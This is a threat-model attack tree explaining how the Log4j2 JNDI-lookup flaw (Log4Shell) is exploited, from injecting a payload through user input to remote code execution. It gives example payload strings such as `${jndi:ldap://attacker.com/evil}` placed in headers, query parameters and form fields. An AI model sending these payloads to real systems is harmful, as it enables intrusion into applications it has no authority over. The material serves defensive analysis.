# Attack Tree Analysis for apache/logging-log4j2

Objective: Compromise Application via Log4j2 Vulnerabilities (RCE)

## Attack Tree Visualization

**High-Risk Sub-Tree:**

**1. Exploit Log4j2 Vulnerability**
    * **1.1. Inject Malicious Payload into Logged Data**
        * **1.1.1. Via User-Controlled Input**
            * **1.1.1.1. HTTP Headers (e.g., User-Agent, Referer, X-Forwarded-For)**
            * **1.1.1.2. HTTP Request Parameters (GET/POST)**
            * **1.1.1.3. Form Data**
    * **1.2. Log4j2 Processes Malicious Payload**
        * **1.2.1. Vulnerable Log4j2 Version is Used**
        * **1.2.2. Logging Configuration Enables Vulnerable Pattern Layouts**
    * **1.3. JNDI Lookup Execution**
        * **1.3.1. Log4j2 Performs JNDI Lookup**
        * **1.3.2. Network Connectivity to Attacker-Controlled JNDI Server**
        * **1.3.3. Attacker-Controlled JNDI Server Responds with Malicious Payload**
        * **1.3.4. Log4j2 Executes Malicious Payload**

## Attack Tree Path: [1. Exploit Log4j2 Vulnerability](./attack_tree_paths/1__exploit_log4j2_vulnerability.md)

*   This is the overarching goal of the attacker, targeting weaknesses within the Log4j2 library itself.

## Attack Tree Path: [1.1. Inject Malicious Payload into Logged Data](./attack_tree_paths/1_1__inject_malicious_payload_into_logged_data.md)

*   **Attack Vector:** The attacker's primary method is to inject a specially crafted string into data that the application logs using Log4j2. This string contains a malicious JNDI (Java Naming and Directory Interface) lookup expression.
*   **Payload Structure:** The malicious string typically follows the format `${jndi:<protocol>://<attacker-controlled-server>/<resource>}`. Common protocols used are `ldap`, `ldaps`, `rmi`, and `dns`.
*   **Goal:** To get Log4j2 to log this malicious string, triggering the vulnerability in subsequent processing.

## Attack Tree Path: [1.1.1. Via User-Controlled Input](./attack_tree_paths/1_1_1__via_user-controlled_input.md)

*   **Attack Vector:** Attackers leverage user-controlled input channels of the application to inject the malicious payload. These are the most readily accessible and frequently logged data sources.

## Attack Tree Path: [1.1.1.1. HTTP Headers (e.g., User-Agent, Referer, X-Forwarded-For)](./attack_tree_paths/1_1_1_1__http_headers__e_g___user-agent__referer__x-forwarded-for_.md)

*   **Attack Method:** The attacker crafts an HTTP request and includes the malicious JNDI lookup string within common HTTP headers like `User-Agent`, `Referer`, `X-Forwarded-For`, or custom headers.
*   **Example:** Setting the `User-Agent` header to: `Mozilla/5.0 (${jndi:ldap://attacker.com/evil}) ...`
*   **Why Effective:** These headers are often logged by web applications for various purposes (analytics, debugging, security logging).

## Attack Tree Path: [1.1.1.2. HTTP Request Parameters (GET/POST)](./attack_tree_paths/1_1_1_2__http_request_parameters__getpost_.md)

*   **Attack Method:** The attacker includes the malicious JNDI lookup string as a value in a GET or POST request parameter.
*   **Example (GET):** `https://vulnerable-app.com/search?query=${jndi:ldap://attacker.com/evil}`
*   **Example (POST):** Submitting a form with a field containing `${jndi:ldap://attacker.com/evil}`.
*   **Why Effective:** User-provided parameters are frequently logged for request tracing and application logic.

## Attack Tree Path: [1.1.1.3. Form Data](./attack_tree_paths/1_1_1_3__form_data.md)

*   **Attack Method:** Similar to request parameters, the attacker injects the malicious JNDI lookup string into form fields submitted to the application.
*   **Example:** Filling out a contact form with a message field containing `${jndi:ldap://attacker.com/evil}`.
*   **Why Effective:** Form data represents direct user input and is often logged for audit trails and application processing.

## Attack Tree Path: [1.2. Log4j2 Processes Malicious Payload](./attack_tree_paths/1_2__log4j2_processes_malicious_payload.md)

*   **Attack Vector:** Once the malicious payload is logged, the vulnerable Log4j2 library processes the log message. If the configuration and version are vulnerable, this processing triggers the JNDI lookup.

## Attack Tree Path: [1.2.1. Vulnerable Log4j2 Version is Used](./attack_tree_paths/1_2_1__vulnerable_log4j2_version_is_used.md)

*   **Condition:** The application must be using a vulnerable version of Log4j2 (e.g., versions prior to 2.17.1 for CVE-2021-44228).
*   **Vulnerability:** These versions contain a flaw that allows JNDI lookups to be performed on strings within log messages without proper sanitization or security checks.

## Attack Tree Path: [1.2.2. Logging Configuration Enables Vulnerable Pattern Layouts](./attack_tree_paths/1_2_2__logging_configuration_enables_vulnerable_pattern_layouts.md)

*   **Condition:** The Log4j2 configuration must use pattern layouts that process the logged data in a way that triggers the lookup. Common patterns like `%m` (message), `%C` (class name), `%logger{}` (logger name) can be vulnerable if they process user-controlled input.
*   **Configuration Issue:** Default or common logging configurations often use these patterns, making applications vulnerable out-of-the-box.

## Attack Tree Path: [1.3. JNDI Lookup Execution](./attack_tree_paths/1_3__jndi_lookup_execution.md)

*   **Attack Vector:** If the previous conditions are met, Log4j2 attempts to resolve the JNDI lookup expression.

## Attack Tree Path: [1.3.1. Log4j2 Performs JNDI Lookup](./attack_tree_paths/1_3_1__log4j2_performs_jndi_lookup.md)

*   **Action:** Log4j2 parses the `${jndi:...}` string and initiates a JNDI lookup based on the specified protocol and server address.

## Attack Tree Path: [1.3.2. Network Connectivity to Attacker-Controlled JNDI Server](./attack_tree_paths/1_3_2__network_connectivity_to_attacker-controlled_jndi_server.md)

*   **Condition:** The application server must have outbound network connectivity to the attacker's specified JNDI server (e.g., `attacker.com`).
*   **Common Scenario:** Most application servers have outbound internet access, making this condition easily met.

## Attack Tree Path: [1.3.3. Attacker-Controlled JNDI Server Responds with Malicious Payload](./attack_tree_paths/1_3_3__attacker-controlled_jndi_server_responds_with_malicious_payload.md)

*   **Attacker Action:** The attacker sets up a malicious JNDI server (e.g., LDAP server) at the specified address (`attacker.com`). This server is configured to respond to the lookup request with a malicious payload.
*   **Payload Type:** The payload is typically a serialized Java object containing malicious code or instructions to download and execute code from another location.

## Attack Tree Path: [1.3.4. Log4j2 Executes Malicious Payload](./attack_tree_paths/1_3_4__log4j2_executes_malicious_payload.md)

*   **Exploitation:** Log4j2 receives the malicious payload from the JNDI server and, due to the vulnerability, executes it within the context of the application.
*   **Outcome:** This results in Remote Code Execution (RCE), granting the attacker control over the application server.

